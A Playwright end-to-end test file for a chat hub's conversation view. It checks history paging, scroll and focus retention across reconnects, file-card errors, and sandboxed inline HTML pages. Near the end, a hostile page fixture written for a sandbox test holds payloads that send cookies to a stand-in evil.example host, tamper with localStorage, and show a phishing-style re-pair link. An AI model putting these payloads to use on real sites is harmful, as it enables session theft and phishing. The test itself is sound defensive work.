import { readFileSync } from "node:fs";
import { inflateSync } from "node:zlib";
import { test, expect, journeyPart } from "./journey";
import type { DoubleOptions } from "./hub-double";
import { journeyDay } from "./clock";
import { ATLAS, PELICAN } from "./world";

const you = (id: number, text: string, at: string) => ({ notification_id: id, target: PELICAN, text, state: "acknowledged", stamped: true, device_id: "journey-device", operator_label: "Daniel", at });
const sup = (id: number, replyTo: number, message: string, at: string, attachments: unknown[] = []) => ({ notification_id: id, reply_to: replyTo, message, summary: "", device_id: "journey-device", kind: "answer", attachments, at });
const file = (artifact_id: string, name: string) => ({ artifact_id, name, mime: "application/pdf", size_bytes: 88_064, sha256: "9f".repeat(32) });

function historyWorld(): DoubleOptions {
  return {
    machines: [ATLAS],
    paired: ["atlas"],
    history: {
      [PELICAN]: [
        // Enough of today to fill the thread, as a real one is when it has an earlier page.
        { has_earlier: true, next_before: 20, messages: [you(21, "Is the release ready to cut?", journeyDay(0, 0, 1)), you(23, "Post the notes when it's out.", journeyDay(0, 0, 3)), you(25, "And close the epic.", journeyDay(0, 0, 5))], replies: [sup(22, 21, "Yes. The gate is green on the release branch.", journeyDay(0, 0, 2), [file("art-report", "Release report card.pdf"), file("art-local-draft", "Draft notes.pdf"), file("art-cloud-down", "Gate log.pdf"), file("art-offline", "Bench results.pdf")]), sup(24, 23, "Will do once the tag is pushed.", journeyDay(0, 0, 4)), sup(26, 25, "Closing it after the notes go out.", journeyDay(0, 0, 6))] },
        { has_earlier: true, next_before: 10, messages: [you(11, "Start the QA epic tomorrow morning.", journeyDay(1))], replies: [sup(12, 11, "Scheduled for 09:00 with three workers.", journeyDay(1, 12, 6))] },
        { has_earlier: false, messages: [you(1, "Draft the QA epic plan.", journeyDay(2, 6)), you(3, "Keep it to three lanes.", journeyDay(2, 6, 30))], replies: [sup(2, 1, "Drafted: three lanes, one gate.", journeyDay(2, 6, 6)), sup(4, 3, "Three lanes it is.", journeyDay(2, 6, 36))] },
      ],
    },
  };
}

test("HUB-J4 read the conversation history", async ({ page, journey }) => {
  const hub = await journey.hub(historyWorld());
  const log = page.getByRole("log");

  await journey.stage("Open the conversation and see the recent turns", async () => {
    await journey.open();
    await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).click();
    await expect(log.getByText("Yes. The gate is green on the release branch.")).toBeVisible();
    await expect(log.getByText("Is the release ready to cut?")).toBeVisible();
    // cas-acb4b: the latest exchange is on screen at once, without Jump to latest.
    const newest = log.getByText("Closing it after the notes go out.");
    const jump = page.getByRole("button", { name: "Jump to latest" });
    /** The thread sits at its tail: nothing below the newest turn is out of view. */
    const atTail = () => page.evaluate(() => {
      const thread = document.querySelector<HTMLElement>(".conversation-reading.thread")!;
      return thread.scrollHeight - thread.clientHeight - thread.scrollTop <= 4;
    });
    await expect.poll(atTail, { message: "the thread opens at its latest turn" }).toBe(true);
    await expect(newest).toBeInViewport();
    await expect(jump).toBeHidden();
    // File cards that finish their layout late (an image, a font) grow the
    // thread after it was pinned to the tail. The thread keeps following it:
    // the newest turn stays on screen and the reader is not marked as having
    // scrolled away.
    const late = await page.addStyleTag({ content: '.msgs a[data-artifact-id] { min-height: 180px; } .msgs [data-key] { min-height: 140px; }' });
    // ResizeObserver and the view's deferred pin settle independently of a
    // fixed frame count. Wait for the same visible tail outcome as on entry.
    await expect.poll(atTail, { message: "late layout growth keeps the thread at its latest turn" }).toBe(true);
    await expect(newest).toBeInViewport();
    await expect(jump).toBeHidden();
    // The rest of the journey reads the thread at its normal size.
    await late.evaluate((node) => (node as Element).remove());
  });

  /** Top of the first thread item on screen: the line the reader is on. */
  const reading = () => page.evaluate(() => {
    const thread = document.querySelector<HTMLElement>(".conversation-reading.thread")!;
    const top = thread.getBoundingClientRect().top;
    const node = [...thread.querySelectorAll<HTMLElement>(".msgs [data-key]")].find((item) => item.getBoundingClientRect().height > 0 && item.getBoundingClientRect().bottom > top)!;
    return { key: node.dataset.key!, y: Math.round(node.getBoundingClientRect().top) };
  });
  /** Load earlier keeps the reading position (journey F7): the turn the reader was on stays put. */
  const loadEarlierKeepsPlace = async (arrived: string, last = false) => {
    // The reader scrolls up to the button first, as a person does.
    await page.getByRole("button", { name: "Load earlier" }).scrollIntoViewIfNeeded();
    await page.evaluate(() => new Promise((ok) => requestAnimationFrame(() => requestAnimationFrame(ok))));
    const before = await reading();
    await page.getByRole("button", { name: "Load earlier" }).click();
    await expect(log.getByText(arrived)).toBeAttached();
    const y = () => page.evaluate((key) => {
      const node = [...document.querySelectorAll<HTMLElement>(".msgs [data-key]")].find((item) => item.dataset.key === key);
      return node ? Math.round(node.getBoundingClientRect().top) : NaN;
    }, before.key);
    if (last) {
      // cas-2093 (F12): on the last page the thread scrolls up just enough
      // to state the end of history at the top; the page the reader asked
      // for reads down from it to where they were.
      await expect(page.getByText("No earlier history")).toBeInViewport();
      expect(await y(), "the reader's turn is below the page they loaded, not above it").toBeGreaterThan(before.y);
      return;
    }
    await expect.poll(y, { message: `"${before.key}" stays where the reader left it` }).toBeGreaterThanOrEqual(before.y - 3);
    expect(await y()).toBeLessThanOrEqual(before.y + 3);
    // The older turns are above, off screen until the reader scrolls up.
    expect(await page.locator(".conversation-reading.thread").evaluate((thread) => thread.scrollTop)).toBeGreaterThan(0);
  };

  await journey.stage("Load earlier turns", async () => {
    await loadEarlierKeepsPlace("Scheduled for 09:00 with three workers.");
    await expect(log.getByText("Scheduled for 09:00 with three workers.")).toBeAttached();
    // The pointer now rests on the thread: its surface stays the cream canvas,
    // not brightened to white by the main-action button hover (journey F11).
    await log.hover();
    await expect(page.locator("#conversation-stage .conversation-thread-slot")).toHaveCSS("filter", "none");
    expect(hub.historyRequests.at(-1)).toMatchObject({ before: 20 });
  });

  await journey.stage("Reach the start of the conversation", async () => {
    // A second page, from further back: the place holds again.
    await loadEarlierKeepsPlace("Drafted: three lanes, one gate.", true);
    expect(hub.historyRequests.at(-1)).toMatchObject({ before: 10 });
    await expect(page.getByText("No earlier history")).toBeVisible();
    await expect(page.getByRole("button", { name: "Load earlier" })).toBeHidden();
    // cas-71af (1584 QA F01): the pressed button hides on the last page, and
    // focus lands on the line that took its place, not the page body.
    await expect(page.getByText("No earlier history")).toBeFocused();
    await expect(log.getByText("Yesterday")).toBeVisible();
    // cas-2093 (F12): the end of history is stated on screen, not left above the fold.
    await expect(page.getByText("No earlier history")).toBeInViewport();
  });
});

test("HUB-J4 open reports and recover their notices without moving the reader", journeyPart, async ({ page, journey }) => {
  const hub = await journey.hub(historyWorld());
  const log = page.getByRole("log");
  await journey.open();
  await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).click();
  await expect(log.getByText("Closing it after the notes go out.")).toBeVisible();
  // Reach the real history boundary before reconnecting. The reattach's newest
  // page still advertises older turns; it must not reset the reader's boundary.
  for (const arrived of ["Scheduled for 09:00 with three workers.", "Drafted: three lanes, one gate."]) {
    await page.getByRole("button", { name: "Load earlier" }).click();
    await expect(log.getByText(arrived)).toBeAttached();
  }
  await expect(page.getByText("No earlier history")).toBeVisible();
  /** Top of the first thread item on screen: the line the reader is on. */
  const reading = () => page.evaluate(() => {
    const thread = document.querySelector<HTMLElement>(".conversation-reading.thread")!;
    const top = thread.getBoundingClientRect().top;
    const node = [...thread.querySelectorAll<HTMLElement>(".msgs [data-key]")].find((item) => item.getBoundingClientRect().height > 0 && item.getBoundingClientRect().bottom > top)!;
    return { key: node.dataset.key!, y: Math.round(node.getBoundingClientRect().top) };
  });

  await journey.stage("Open a report the supervisor sent", async () => {
    // cassy#910: the report card opens its hosted copy through a short-lived
    // signed link the machine asks Cloud for, in a new tab on the store's own
    // origin. A file that never reached Cloud says so instead.
    await page.context().route("https://store.test/**", (route) => route.fulfill({ contentType: "text/html", body: "<h1>Release report card</h1>" }));
    const report = log.locator('a[data-artifact-id="art-report"]');
    await report.scrollIntoViewIfNeeded();
    // Inline PDF previews request a session ticket, then proxy bytes. Wait
    // for this fixture's unavailable preview before counting the separate Open URL.
    await expect(log.locator('.rich-attachment:has(a[data-artifact-id="art-report"]) .rich-media')).toContainText("Preview unavailable");
    const reportRequests = hub.artifactRequests.filter((id) => id === "art-report").length;
    const opened = page.waitForEvent("popup");
    await report.click();
    const tab = await opened;
    await tab.waitForURL(/^https:\/\/store\.test\/view\/art-report\?sig=journey$/);
    await expect(tab.getByRole("heading", { name: "Release report card" })).toBeVisible();
    await tab.close();
    expect(hub.artifactRequests.filter((id) => id === "art-report")).toHaveLength(reportRequests + 1);
    expect(page.url()).not.toContain("#artifact:");

    // Journey F6: every failure is said on the card that was pressed, not in
    // a toast at the top of the thread, and no tab is left open.
    const toast = page.locator("#toast.visible");
    const note = (id: string) => log.locator(`a[data-artifact-id="${id}"] .fnote`);
    const local = log.locator('a[data-artifact-id="art-local-draft"]');
    await local.scrollIntoViewIfNeeded();
    await expect(log.locator('.rich-attachment:has(a[data-artifact-id="art-local-draft"]) .rich-media')).toContainText("Preview unavailable");
    const localRequests = hub.artifactRequests.filter((id) => id === "art-local-draft").length;
    await local.click();
    await expect(note("art-local-draft")).toHaveText("This file was only saved on Atlas · Linux. It was never uploaded to Cloud, so it can't open here.");
    await expect(local).toHaveAccessibleName(/never uploaded to Cloud/);
    expect(hub.artifactRequests.filter((id) => id === "art-local-draft")).toHaveLength(localRequests + 1);
    // Known now: opening it again opens no tab at all.
    let popups = 0;
    const countPopup = () => { popups += 1; };
    page.on("popup", countPopup);
    await local.click();
    await expect.poll(() => hub.artifactRequests.filter((id) => id === "art-local-draft").length).toBe(localRequests + 2);
    await expect(note("art-local-draft")).toContainText("only saved on Atlas · Linux");
    expect(popups, "no tab for a file known to be only on the machine").toBe(0);
    page.off("popup", countPopup);

    // cas-e503: Cloud failing says what to do, and a connected machine that
    // sends nothing is not called unreachable while the header says Live.
    await log.locator('a[data-artifact-id="art-cloud-down"]').click();
    await expect(note("art-cloud-down")).toHaveText("Cassy Cloud couldn't open the file right now. Wait a minute, then open it again.");
    await expect(page.locator("#conversation-connection")).toContainText("Live");
    await log.locator('a[data-artifact-id="art-offline"]').click();
    await expect(note("art-offline")).toHaveText("Atlas · Linux is connected but didn't send the file. Try again in a moment.");
    await expect(toast).toHaveCount(0);
    await expect(log).not.toContainText(/\btap\b/i);
    expect(page.context().pages()).toHaveLength(1);

    // cas-c808 QA F01: a note about reaching the machine does not outlive the
    // outage. Once the connection is back it leaves the card; a note about
    // the file itself stays.
    const header = page.locator("#conversation-connection");
    // cas-2093 (F3): the reader is on the file cards when the connection drops.
    const anchorY = (key: string) => page.evaluate((key) => {
      const node = [...document.querySelectorAll<HTMLElement>(".msgs [data-key]")].find((item) => item.dataset.key === key);
      return node ? Math.round(node.getBoundingClientRect().top) : NaN;
    }, key);
    /** The reader's turn stays where it was (within 3 px) across what follows. */
    const holds = async (anchor: { key: string; y: number }, what: string) => {
      // Await the anchored presentation in both directions. The previous
      // asymmetric poll accepted a downward drift before that frame ran.
      await expect.poll(async () => Math.abs(await anchorY(anchor.key) - anchor.y),
        { message: `"${anchor.key}" stays where the reader left it ${what}` }).toBeLessThanOrEqual(3);
    };
    const beforeDrop = await reading();
    // cas-c945 QA F01: what a screen reader would hear. Each change of text
    // is attributed to its nearest live region (role status/alert/log or
    // aria-live, an aria-live="off" ancestor silencing it), and the changed
    // text itself is recorded, not the whole region's.
    await page.evaluate(() => {
      const w = window as unknown as { __heard: string[] };
      w.__heard = [];
      const region = (node: Node): Element | null => {
        for (let element = node instanceof Element ? node : node.parentElement; element; element = element.parentElement) {
          const live = element.getAttribute("aria-live");
          if (live === "off") return null;
          if (live || ["status", "alert", "log"].includes(element.getAttribute("role") ?? "")) return element;
        }
        return null;
      };
      new MutationObserver((records) => {
        const last = new Map<Element, string>();
        for (const record of records) {
          for (const node of record.type === "characterData" ? [record.target] : [...record.addedNodes]) {
            const speaker = region(node);
            const words = node.textContent?.trim() ?? "";
            if (!speaker || !words || last.get(speaker) === words) continue;
            last.set(speaker, words);
            w.__heard.push(words);
          }
        }
      }).observe(document.body, { subtree: true, childList: true, characterData: true });
    });
    hub.hold(PELICAN);
    hub.drop(PELICAN);
    await expect(header).toContainText("Reconnecting");
    await holds(beforeDrop, "when the connection drops");
    // Journey F28: the card that said the machine "is connected" says what
    // the header, banner, row and footer say, without another click, and
    // without a second announcement of the outage.
    const reconnecting = "Lost connection to Atlas · Linux. Reconnecting… Open the file again when it's back.";
    await expect(note("art-offline")).toHaveText(reconnecting);
    await expect(note("art-offline")).not.toHaveAttribute("role", "status");
    await expect(log.locator('a[data-artifact-id="art-offline"]')).toHaveAccessibleName(/Lost connection to Atlas · Linux\. Reconnecting…/);
    await expect(log).not.toContainText("is connected");
    // The banner says the drop once; the card's rewrite is not a second
    // announcement, through its own role or the thread's log around it. The
    // page clock runs the app's next second and a half of timers at once, so
    // a late repeat is heard however loaded the host (cas-c4b2).
    await page.clock.runFor(1_500);
    const heard = await page.evaluate(() => (window as unknown as { __heard: string[] }).__heard);
    expect(heard.filter((words) => /lost connection|reconnecting/i.test(words)), "the outage is spoken once, by the banner").toEqual(["Lost connection to Atlas · Linux. Reconnecting…"]);
    await expect(note("art-offline")).toHaveAttribute("aria-live", "off");
    await log.locator('a[data-artifact-id="art-offline"]').click();
    await expect(note("art-offline")).toHaveText(reconnecting);
    // Opening the card brought it into view: that is where the reader is now.
    const beforeReconnect = await reading();
    const firstPages = hub.historyRequests.filter((request) => request.before === undefined).length;
    hub.release(PELICAN);
    await expect(header).toHaveText(" · Live", { timeout: 30_000 });
    // The reattach asks for the newest page again; it neither moves the reader
    // nor brings "Load earlier" back once the start was reached (cas-2093).
    await expect.poll(() => hub.historyRequests.filter((request) => request.before === undefined).length).toBeGreaterThan(firstPages);
    await holds(beforeReconnect, "across the reconnect");
    await expect(page.getByRole("button", { name: "Load earlier" })).toBeHidden();
    await expect(page.getByText("No earlier history")).toBeAttached();
    await expect(note("art-offline")).toHaveCount(0);
    await expect(note("art-cloud-down")).toHaveCount(0);
    await expect(note("art-local-draft")).toContainText("only saved on Atlas · Linux");
    expect(page.context().pages()).toHaveLength(1);
  });
});

test("HUB-J4 a machine reconnect while reading mid-history keeps keyboard focus on Load earlier (cas-d362)", journeyPart, async ({ page, journey }) => {
  // The multiplex machine path rebuilds the conversation shell a few ms after
  // the header turns Live. A reader who tabs to Load earlier in that window
  // lost focus to the page, and Enter then asked for nothing (cas-d362).
  const hub = await journey.hub({
    machines: [ATLAS],
    paired: ["atlas"],
    multiplex: true,
    history: {
      [PELICAN]: [
        { has_earlier: true, next_before: 20, messages: [you(21, "Is the release ready to cut?", journeyDay(0, 0, 1)), you(23, "Post the notes when it's out.", journeyDay(0, 0, 3)), you(25, "And close the epic.", journeyDay(0, 0, 5))], replies: [sup(22, 21, "Yes. The gate is green on the release branch.", journeyDay(0, 0, 2)), sup(24, 23, "Will do once the tag is pushed.", journeyDay(0, 0, 4)), sup(26, 25, "Closing it after the notes go out.", journeyDay(0, 0, 6))] },
        { has_earlier: true, next_before: 10, messages: [you(11, "Start the QA epic tomorrow morning.", journeyDay(1))], replies: [sup(12, 11, "Scheduled for 09:00 with three workers.", journeyDay(1, 12, 6))] },
        { has_earlier: false, messages: [you(1, "Draft the QA epic plan.", journeyDay(2, 6)), you(3, "Keep it to three lanes.", journeyDay(2, 6, 30))], replies: [sup(2, 1, "Drafted: three lanes, one gate.", journeyDay(2, 6, 6)), sup(4, 3, "Three lanes it is.", journeyDay(2, 6, 36))] },
      ],
    },
  });
  // The reader's Tab lands on Load earlier the moment the header says Live:
  // inside the window before the shell rebuild, where a test's own focus()
  // after waiting for Live would usually arrive too late to see it.
  await page.addInitScript(() => {
    new MutationObserver(() => {
      const armed = window as unknown as { __focusLoadEarlierAtLive?: boolean };
      if (!armed.__focusLoadEarlierAtLive) return;
      if (document.querySelector("#conversation-connection")?.textContent !== " · Live") return;
      armed.__focusLoadEarlierAtLive = false;
      document.querySelector<HTMLElement>(".conversation-load-earlier")?.focus();
    }).observe(document, { subtree: true, childList: true, characterData: true });
  });
  const log = page.getByRole("log");
  const header = page.locator("#conversation-connection");
  const loadEarlier = page.getByRole("button", { name: "Load earlier" });

  await journey.stage("Read mid-history, then move on to the composer", async () => {
    await journey.open();
    await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).click();
    await expect(log.getByText("Closing it after the notes go out.")).toBeVisible();
    await loadEarlier.scrollIntoViewIfNeeded();
    await loadEarlier.click();
    await expect(log.getByText("Scheduled for 09:00 with three workers.")).toBeAttached();
    await expect(loadEarlier).toBeEnabled();
    await page.getByRole("textbox", { name: "Your message" }).focus();
  });

  await journey.stage("The machine reconnects as the reader tabs back to Load earlier", async () => {
    await page.evaluate(() => { (window as unknown as { __focusLoadEarlierAtLive?: boolean }).__focusLoadEarlierAtLive = true; });
    await hub.down("atlas", { sockets: "close" });
    await expect(header).toContainText("Reconnecting");
    await hub.up("atlas");
    await expect(header).toHaveText(" · Live", { timeout: 30_000 });
    // Past the rebuild: focus is still where the reader put it. The rebuild's
    // timers run on the page clock, not over a fixed pause (cas-c4b2).
    await page.clock.runFor(500);
    await expect(loadEarlier).toBeFocused();
  });

  await journey.stage("Enter loads the start of the conversation", async () => {
    await page.keyboard.press("Enter");
    await expect(log.getByText("Drafted: three lanes, one gate.")).toBeAttached();
    expect(hub.historyRequests.at(-1)).toMatchObject({ before: 10 });
    await expect(page.getByText("No earlier history")).toBeFocused();
  });
});

// cas-c2cb: right after a reconnect the thread is put back at the reader's
// turn (cas-2093). A reader who tabs to Load earlier in that window asked to
// see it; the pending put-back must not then scroll the focused control out of
// the thread. Tall enough history that the two positions differ, on a desktop
// and a phone.
// The reader rests either in the composer (the thread follows its tail) or on
// the header's Raw output (the thread stays on their earlier page).
for (const [name, viewport, rest] of [
  ["following desktop", { width: 1280, height: 800 }, "composer"],
  ["following phone", { width: 390, height: 844 }, "composer"],
  ["reading desktop", { width: 1280, height: 800 }, "header"],
  ["reading phone", { width: 390, height: 844 }, "header"],
] as const) {
  test(`HUB-J4 cas-c2cb ${name}: a reader who tabs to Load earlier during a reconnect sees it, and paging goes on`, journeyPart, async ({ page, journey }) => {
    const turn = (id: number, text: string, day: number) => ({ notification_id: id, reply_to: null, message: text, summary: "", device_id: "journey-device", kind: "answer", attachments: [], at: journeyDay(day, 0, id % 20) });
    await page.setViewportSize(viewport);
    const hub = await journey.hub({
      machines: [ATLAS],
      paired: ["atlas"],
      multiplex: true,
      history: {
        [PELICAN]: [
          { has_earlier: true, next_before: 30, messages: [], replies: Array.from({ length: 12 }, (_, i) => turn(40 + i, `Recent turn ${i}: the release gate and a long operator history to read through.`, 0)) },
          { has_earlier: true, next_before: 10, messages: [], replies: Array.from({ length: 8 }, (_, i) => turn(12 + i, `Earlier turn ${i}: keep the reading position.`, 1)) },
          { has_earlier: false, messages: [], replies: [turn(1, "The oldest entry, reached by keyboard.", 2)] },
        ],
      },
    });
    await page.addInitScript(() => {
      new MutationObserver(() => {
        const armed = window as unknown as { __focusLoadEarlierAtLive?: boolean };
        if (!armed.__focusLoadEarlierAtLive) return;
        if (document.querySelector("#conversation-connection")?.textContent !== " · Live") return;
        armed.__focusLoadEarlierAtLive = false;
        document.querySelector<HTMLElement>(".conversation-load-earlier")?.focus();
      }).observe(document, { subtree: true, childList: true, characterData: true });
    });
    const log = page.getByRole("log");
    const header = page.locator("#conversation-connection");
    const loadEarlier = page.getByRole("button", { name: "Load earlier" });
    /** How much of the focused control the thread shows: its box inside the thread's scroll box. */
    const shownInThread = () => loadEarlier.evaluate((button) => {
      const thread = button.closest<HTMLElement>(".conversation-reading.thread")!.getBoundingClientRect();
      const box = button.getBoundingClientRect();
      return { top: Math.round(box.top - thread.top), bottom: Math.round(thread.bottom - box.bottom), height: Math.round(box.height) };
    });

    await journey.stage(`Read an earlier page mid-history, then move on to the composer (${name})`, async () => {
      await journey.open();
      await page.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).click();
      await expect(log.getByText("Recent turn 11:")).toBeVisible();
      await loadEarlier.scrollIntoViewIfNeeded();
      await loadEarlier.click();
      await expect(log.getByText("Earlier turn 0:")).toBeAttached();
      await expect(loadEarlier).toBeEnabled();
      if (rest === "composer") await page.getByRole("textbox", { name: "Your message" }).focus();
      // A header control outside the thread: the thread keeps the earlier page.
      else await page.locator("#conversation-raw-output").focus();
    });

    await journey.stage(`The reader tabs to Load earlier as the machine comes back, and sees it (${name})`, async () => {
      await page.evaluate(() => { (window as unknown as { __focusLoadEarlierAtLive?: boolean }).__focusLoadEarlierAtLive = true; });
      await hub.down("atlas", { sockets: "close" });
      await expect(header).toContainText("Reconnecting");
      await hub.up("atlas");
      await expect(header).toHaveText(" · Live", { timeout: 30_000 });
      // Past the rebuild and the put-back of the reading position, both run
      // on the page clock rather than over a fixed pause (cas-c4b2).
      await page.clock.runFor(650);
      await expect(loadEarlier).toBeFocused();
      const shown = await shownInThread();
      expect(shown.top, "the focused Load earlier is not above the thread").toBeGreaterThanOrEqual(0);
      expect(shown.bottom, "the focused Load earlier is not below the thread").toBeGreaterThanOrEqual(0);
      // cas-d043 H07: it shows its ring on the aurora.
      expect(await loadEarlier.evaluate((node) => { const style = getComputedStyle(node); return style.outlineStyle !== "none" && parseFloat(style.outlineWidth) >= 2; }), "the focused Load earlier shows a ring").toBe(true);
    });

    await journey.stage(`Enter still loads the start of the conversation (${name})`, async () => {
      await page.keyboard.press("Enter");
      await expect(log.getByText("The oldest entry, reached by keyboard.")).toBeAttached();
      expect(hub.historyRequests.at(-1)).toMatchObject({ before: 10 });
      await expect(page.getByText("No earlier history")).toBeFocused();
    });
  });
}

// cas-3aff: a supervisor's HTML page shows inline, in a frame the machine and
// Commander both lock down; threat model:
// docs/design/hub-web/visual-replies-threat-model.md.
const page = (artifact_id: string, name: string) => ({ artifact_id, name, mime: "text/html", size_bytes: 4_096, sha256: "1a".repeat(32) });
const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAIAAABLbSncAAAAEklEQVR4nGP4z8DAwMDAxMAAAB7SAwFcCZ+FAAAAAElFTkSuQmCC", "base64");
const REPORT = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="color-scheme" content="light dark"><title>Gate report</title>
<style>body{font:15px/1.5 system-ui;margin:20px;color:#1b1d24} figure{margin:12px 0} img.chart{width:120px;height:120px;image-rendering:pixelated} @media (prefers-color-scheme: dark){body{background:rgb(21,23,29);color:#e9e6e0}}</style></head>
<body><h1>Gate report</h1><p>All three lanes are green.</p>
<figure><svg role="img" aria-label="Lane diagram" width="240" height="60" viewBox="0 0 240 60"><rect x="4" y="14" width="64" height="32" rx="6" fill="#2f6fde"/><rect x="88" y="14" width="64" height="32" rx="6" fill="#2f9e5b"/><rect x="172" y="14" width="64" height="32" rx="6" fill="#c9821f"/></svg></figure>
<figure><img class="chart" alt="Pass rate chart" src="art-chart"><img class="chart" alt="Inline chart" src="data:image/png;base64,${PNG.toString("base64")}"></figure>
<figure><video aria-label="Run recording" src="art-clip" controls muted width="320" height="180"></video></figure></body></html>`;
const EVIL = "https://evil.example";
const HOSTILE = `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Hostile page</title>
<meta http-equiv="refresh" content="0;url=${EVIL}/refresh">
<link rel="stylesheet" href="${EVIL}/style.css"><link rel="prefetch" href="${EVIL}/prefetch">
<style>@font-face{font-family:leak;src:url(${EVIL}/font.woff)} body{font-family:leak;background:url(${EVIL}/bg.png)}</style>
</head><body><h1>Hostile page</h1>
<img alt="pixel" src="${EVIL}/pixel.png" onerror="parent.postMessage('onerror', '*')"><video src="${EVIL}/clip.webm"></video>
<iframe title="nested" src="${EVIL}/frame"></iframe><object data="${EVIL}/object"></object>
<p><a id="js" href="javascript:parent.postMessage('js-link','*')">Run</a> <a id="top" href="${EVIL}/top" target="_top">Re-pair this machine</a> <a id="pop" href="${EVIL}/pop" target="_blank">Open a window</a></p>
<form action="${EVIL}/form" method="post"><input name="secret" value="x"><button id="submit">Submit</button></form>
<script>document.body.dataset.ran = "1"; parent.postMessage("script", "*"); try { parent.localStorage.setItem("pwned", "1"); localStorage.setItem("pwned", "1"); } catch (e) { parent.postMessage("storage-blocked", "*"); } fetch("${EVIL}/fetch?k=" + document.cookie);</script></body></html>`;

/** The painted RGB of one screen pixel. A 1x1 PNG row has no neighbours, so every filter leaves its bytes raw. */
async function paintedPixel(tab: import("@playwright/test").Page, x: number, y: number): Promise<number[]> {
  const png = await tab.screenshot({ clip: { x, y, width: 1, height: 1 } });
  const data: Buffer[] = [];
  for (let at = 8; at < png.length;) {
    const length = png.readUInt32BE(at);
    if (png.toString("latin1", at + 4, at + 8) === "IDAT") data.push(png.subarray(at + 8, at + 8 + length));
    at += 12 + length;
  }
  return [...inflateSync(Buffer.concat(data)).subarray(1, 4)];
}

for (const [name, viewport] of [["desktop", { width: 1280, height: 800 }], ["phone", { width: 390, height: 844 }]] as const) {
  test(`HUB-J4 cas-3aff ${name}: a supervisor's page shows inline, and a hostile page stays in its sandbox`, journeyPart, async ({ page: tab, journey }) => {
    await tab.setViewportSize(viewport);
    const hub = await journey.hub({
      machines: [ATLAS],
      paired: ["atlas"],
      history: { [PELICAN]: [{ has_earlier: false, messages: [you(1, "Send me the gate report.", journeyDay(0, 0, 1))], replies: [sup(2, 1, "Here it is, and the page the scanner flagged.", journeyDay(0, 0, 2), [page("art-report", "Gate report.html"), page("art-hostile", "Flagged page.html")])] }] },
      visualPages: {
        "art-report": { mime: "text/html; charset=utf-8", body: REPORT },
        "art-hostile": { mime: "text/html; charset=utf-8", body: HOSTILE },
        "art-chart": { mime: "image/png", body: PNG },
        "art-clip": { mime: "video/webm", body: readFileSync(new URL("./visual-clip.webm", import.meta.url)) },
      },
    });
    // Anything the pages send to another host is recorded, never answered.
    const leaked: string[] = [];
    await tab.context().route(`${EVIL}/**`, (route) => { leaked.push(route.request().url()); return route.abort(); });
    await tab.route("https://foreign.example/**", (route) => route.fulfill({ contentType: "text/html", body: `<iframe title="reframed" src="${new URL(route.request().url()).searchParams.get("src")}"></iframe>` }));
    await tab.addInitScript(() => { (window as unknown as { heard: unknown[] }).heard = []; addEventListener("message", (event) => (window as unknown as { heard: unknown[] }).heard.push(event.data)); });
    await journey.open();
    await tab.getByRole("navigation", { name: "Choose a supervisor" }).getByRole("button", { name: /cas-src/ }).click();
    const log = tab.getByRole("log");
    await expect(log.getByText("Here it is, and the page the scanner flagged.")).toBeVisible();
    const storage = () => tab.evaluate(async () => ({ local: Object.keys(localStorage).sort(), databases: (await indexedDB.databases()).map((db) => db.name).sort() }));
    const before = await storage();
    const tabs = tab.context().pages().length;

    await journey.stage(`See a page the supervisor sent, inline (${name})`, async () => {
      const report = log.getByTitle("Gate report.html, a page from the supervisor");
      await report.scrollIntoViewIfNeeded();
      await expect(report).toHaveAttribute("sandbox", "");
      await expect(report).toHaveAttribute("src", /^https:\/\/atlas\.test\/v1\/pages\/ticket-\d+-x+\/art-report$/);
      const inside = tab.frameLocator('iframe[title="Gate report.html, a page from the supervisor"]');
      await expect(inside.getByRole("heading", { name: "Gate report" })).toBeVisible();
      await expect(inside.getByRole("img", { name: "Lane diagram" })).toBeVisible();
      await expect(inside.getByRole("img", { name: "Inline chart" })).toBeVisible();
      await expect.poll(() => hub.pageRequests.filter((path) => /\/art-(chart|clip)$/.test(path)).length, { message: "the page's own image and video load through its ticket" }).toBeGreaterThanOrEqual(2);
      expect(hub.pageRequests.every((path) => path.startsWith("/v1/pages/ticket-"))).toBe(true);
      expect([...hub.pageTickets.values()].map((held) => held.origin)).toEqual(expect.arrayContaining([new URL(tab.url()).origin]));
      // No agent markup ever enters Commander's own document.
      await expect(tab.locator("#app h1", { hasText: "Gate report" })).toHaveCount(0);
      await expect(tab.locator("iframe[srcdoc]")).toHaveCount(0);
    });

    await journey.stage(`In dark mode the page sits in the theme, and a dark-capable page renders dark (${name})`, async () => {
      // cas-2326: the frame chrome follows Commander's scheme and hands it to
      // the page (the iframe's color-scheme); a page without dark styles gets
      // the browser's own opaque backdrop, so it stays legible.
      await tab.emulateMedia({ colorScheme: "dark" });
      await expect(tab.locator("html")).toHaveAttribute("data-scheme", "dark");
      const card = log.locator('a.sheet[data-artifact-id="art-report"]');
      const frame = log.locator('.visual-page[data-artifact-id="art-report"] .visual-frame');
      await expect(frame).toHaveCSS("background-color", await card.evaluate((node) => getComputedStyle(node).backgroundColor));
      await expect(frame.locator("iframe")).toHaveCSS("color-scheme", "dark");
      const inside = tab.frameLocator('iframe[title="Gate report.html, a page from the supervisor"]');
      await expect(inside.locator("body")).toHaveCSS("background-color", "rgb(21, 23, 29)");
      // A page with no dark styles keeps a light backdrop under its dark text.
      const plain = log.getByTitle("Flagged page.html, a page from the supervisor");
      await plain.scrollIntoViewIfNeeded();
      await expect(tab.frameLocator('iframe[title="Flagged page.html, a page from the supervisor"]').getByRole("heading", { name: "Hostile page" })).toBeVisible();
      const box = (await plain.boundingBox())!;
      expect(Math.min(...await paintedPixel(tab, Math.round(box.x + box.width - 6), Math.round(box.y + box.height - 6))), "the plain page is legible on a light backdrop").toBeGreaterThan(200);
      await tab.emulateMedia({ colorScheme: "light" });
      await expect(tab.locator("html")).toHaveAttribute("data-scheme", "light");
    });

    await journey.stage(`A hostile page can't run script, reach storage, leave its frame or call out (${name})`, async () => {
      const hostileFrame = log.getByTitle("Flagged page.html, a page from the supervisor");
      await hostileFrame.scrollIntoViewIfNeeded();
      const hostile = tab.frameLocator('iframe[title="Flagged page.html, a page from the supervisor"]');
      await expect(hostile.getByRole("heading", { name: "Hostile page" })).toBeVisible();
